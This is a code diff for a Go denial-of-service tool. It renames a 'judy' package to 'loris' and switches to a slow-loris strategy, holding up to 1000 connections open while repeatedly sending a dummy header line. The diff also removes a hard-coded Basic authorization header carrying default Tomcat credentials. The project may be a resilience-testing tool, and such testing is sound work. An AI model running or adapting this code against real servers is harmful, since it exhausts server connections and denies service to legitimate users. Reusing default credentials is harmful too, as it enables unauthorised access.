@@ -1,4 +1,4 @@
-package judy
+package loris
 
 import (
 	"flag"
@@ -32,7 +32,7 @@ var (
 	flagMax   = flagsJudy.Int("max", 1000, "The maximum number of connections to establish")
 )
 
-func Judy() {
+func Loris() {
 	logFlags := helper.InitLogFlags(flagsJudy)
 	flagsJudy.Parse(os.Args[2:])
 	logFlags.Apply()
@@ -42,16 +42,16 @@ func Judy() {
 	host := *flagHost
 	size := *flagSize
 	once := *flagOnce
-	sendBytes := *flagBytes
+	// sendBytes := *flagBytes
 	sendDelay := *flagDelay
 	duration := *flagTime
 	maxConns := *flagMax
 
 	logger.Info("Starting")
 
-	// Create a new Udy instance
-	sendStrategy := udy.NewFixedByteSendStrategy(sendBytes, sendDelay)
-	// sendStrategy := udy.NewRepeaterSendStrategy([]byte("x-snacks-slow-loris: boom\n"), size, sendDelay)
+	// Create a new Judy instance
+	// sendStrategy := udy.NewFixedByteSendStrategy(sendBytes, sendDelay)
+	sendStrategy := udy.NewRepeaterSendStrategy([]byte("x-snacks-slow-loris: boom\n"), size, sendDelay)
 	l := udy.NewUdy(sendStrategy, maxConns)
 
 	if test {
@@ -113,6 +113,7 @@ func isPrintable(bytes []byte) bool {
 	return true
 }
 
+// func executeOnce(l judy.Judy, prefix []byte) {
 func executeOnce(l udy.Udy, prefix []byte) {
 	host := *flagHost
 	port := *flagPort
@@ -133,8 +134,7 @@ func executeOnce(l udy.Udy, prefix []byte) {
 
 func getPayloadPrefix() []byte {
 	// if http...
-	// return getHTTPPayload(http.Post, helper.ApplicationJsonPrefix)
-	return getHTTPPayload(http.Post, helper.ApplicationXWWWFormUrlencodedPrefix)
+	return getHTTPPayload(http.Post, helper.ApplicationJsonPrefix)
 }
 
 func getHTTPPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
@@ -151,7 +151,6 @@ func getHTTPPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
 		"Accept":         "*/*",
 		"Content-Length": strconv.Itoa(size + contentTypePrefixLen),
 		"Host":           host + ":" + strconv.Itoa(port),
-		"Authorization":  "Basic dG9tY2F0OnRvbWNhdA==",
 	}
 
 	builder := http.HttpRequestBuilder{
@@ -162,6 +161,7 @@ func getHTTPPayload(verb http.HttpVerb, media helper.MediaPrefix) []byte {
 		Headers:  headers,
 	}
 
-	httpRequest := builder.BuildBytes()
-	return append(httpRequest, contentTypePrefix...)
+	// httpRequest := builder.BuildBytes()
+	// return append(httpRequest, contentTypePrefix...)
+	return []byte(builder.BuildHead())
 }
